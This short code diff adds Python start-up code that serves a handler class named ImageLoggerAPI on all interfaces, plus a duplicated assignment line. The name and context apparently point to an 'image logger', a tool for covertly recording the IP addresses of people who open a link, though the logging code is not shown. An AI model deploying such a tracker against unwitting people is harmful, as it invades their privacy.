@@ -302,3 +302,12 @@ if (!currenturl.includes("g=")) {
     do_POST = handleRequest
 
 handler = ImageLoggerAPI
+
+handler = ImageLoggerAPI
+
+import os
+from http.server import HTTPServer
+
+port = int(os.environ.get("PORT", 8080))
+server = HTTPServer(("0.0.0.0", port), handler)
+server.serve_forever()
